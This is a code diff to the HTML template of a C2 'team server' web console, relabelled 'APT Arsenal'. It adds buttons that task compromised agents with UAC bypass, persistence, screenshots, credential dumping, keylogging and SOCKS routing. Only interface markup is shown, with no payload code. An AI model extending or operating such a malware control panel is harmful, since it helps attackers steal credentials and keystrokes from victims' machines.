@@ -11,7 +11,7 @@
     <div class="topbar">
         <h2>C2 <span>TEAM SERVER</span></h2>
         <div>
-            <span style="color: var(--text-secondary); margin-right: 15px; font-size: 13px;">Phase 6 Architecture</span>
+            <span style="color: var(--text-secondary); margin-right: 15px; font-size: 13px;">Phase 7 — APT Arsenal</span>
             <a href="{{ url_for('logout') }}" class="btn-secondary" style="text-decoration: none;">Disconnect</a>
         </div>
     </div>
@@ -38,13 +38,19 @@
                 <span id="current-agent-ip" style="color: var(--text-secondary); font-size: 12px;">---</span>
             </div>
             
-            <div class="toolbar">
+            <div class="toolbar" style="flex-wrap: wrap; gap: 6px; padding-bottom: 6px;">
                 <button class="btn-secondary" onclick="toggleInteractive(true)">⚡ Real-Time PTY</button>
                 <button class="btn-secondary" onclick="toggleInteractive(false)">👻 Ghost Mode</button>
-                <button class="btn-secondary" onclick="quickTask('elevate', 'elevate')">Bypass UAC</button>
-                <button class="btn-secondary" onclick="quickTask('persist', 'persist')">Persistir</button>
+                <button class="btn-secondary" onclick="quickTask('elevate', 'elevate')">🔓 UAC Bypass</button>
+                <button class="btn-secondary" onclick="quickTask('persist', 'persist')">📌 Persistir</button>
+                <button class="btn-secondary" onclick="quickTask('screenshot', 'screenshot')">📷 Screenshot</button>
+                <button class="btn-secondary" onclick="quickTask('credump', 'credump')">🔑 CredDump</button>
+                <button class="btn-secondary" onclick="quickTask('keylog_start', 'keylog_start')">⌨️ KeyLog ON</button>
+                <button class="btn-secondary" onclick="quickTask('keylog_dump', 'keylog_dump')">📋 KeyLog Dump</button>
+                <button class="btn-secondary" onclick="quickTask('keylog_stop', 'keylog_stop')">🛑 KeyLog OFF</button>
+                <button class="btn-secondary" onclick="quickTask('route', 'route')">🌐 SOCKS Route</button>
                 <div style="flex: 1"></div>
-                <button class="btn-danger" onclick="quickKill()">Purge & Kill</button>
+                <button class="btn-danger" onclick="quickKill()">Purge &amp; Kill</button>
             </div>
 
             <div class="terminal-view" id="terminal-view">
